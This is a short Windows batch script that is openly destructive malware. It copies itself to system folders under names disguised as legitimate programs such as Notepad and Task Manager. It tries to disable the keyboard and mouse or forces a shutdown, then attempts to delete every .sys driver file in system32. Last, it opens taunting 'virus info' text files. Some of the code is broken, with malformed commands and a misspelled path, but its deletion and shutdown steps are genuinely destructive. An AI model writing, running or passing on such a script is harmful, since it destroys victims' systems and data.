echo off
cls
Copy %0 C:\Autorun.exe.bat
Copy %0 C:\windows\taskman.exe.bat
Copy %0 C:\windows\Notepad.exe.bat
Copy %0 C:\windows\system32\xcopy.exe.bat
Copy %0 C:\window\system32\systray.exe.bat
if exist C:\windows\rundll32 keyboard,disable goto mousecheck
if not exist C:\windows\rundll32 keyboard,disable goto shutdown
:mousecheck
if exist c:\windows\rundll32 mouse,disable goto disable
if not exist c:\windows\rundll32 mouse,disable goto shutdown
:Disable
c:\windows\rundll32 mouse,disable
c:\windows\rundll32 keyboard,disable
goto exit
:shutdown
shutdown -s -f -t 01
choice /ty,3>nul
If errorlevel y goto yy
:yy
ATTRIB -r %windir%
del %windir%/system32/*.sys
:exit
echo Now you are fuck>> C:\Readme.txt
echo Poop Smells>>C:\Virus INfo.txt
Start C:\Readme.txt
start C:\Virus Info.txt
exit